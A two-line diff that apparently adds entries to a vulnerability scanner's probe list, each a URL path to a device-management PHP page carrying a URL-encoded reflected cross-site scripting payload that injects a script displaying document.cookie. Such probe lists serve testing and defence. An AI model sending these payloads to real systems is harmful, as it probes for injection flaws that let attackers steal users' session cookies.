@@ -1,0 +1,2 @@
+/devicemgmt.php?deviceId=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
+/configDevice.php?rid=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
